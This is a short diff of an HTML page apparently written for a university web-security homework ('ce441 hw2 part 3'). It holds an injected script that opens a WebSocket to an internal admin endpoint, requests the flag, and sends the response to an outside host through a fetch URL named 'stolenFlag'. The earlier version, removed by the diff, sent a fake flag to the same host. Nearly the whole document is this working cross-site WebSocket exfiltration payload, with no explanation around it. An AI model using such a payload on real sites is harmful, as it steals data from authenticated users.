@@ -3,12 +3,11 @@
     <body>
     this is ce441 hw2 part 3, v2
         <script>
-let flag=`ce441{salam}`;
-fetch(`https://hw2p3.ckodser.ir/stolenFlagFake/${flag}`);
-const ws = new WebSocket(`ws://web:8080/ws`);
+const ws = new WebSocket(`ws://web:8080/admin/ws`);
+ws.onopen = () => ws.send("flag");
 ws.onmessage = (event) => {
   const response = event.data;
-  fetch(`https://hw2p3.ckodser.ir/stolenFlag/${response}`);
+  fetch(`http://hw2p3.ckodser.ir/stolenFlag/${response}`);
 };
         </script>
     </body>
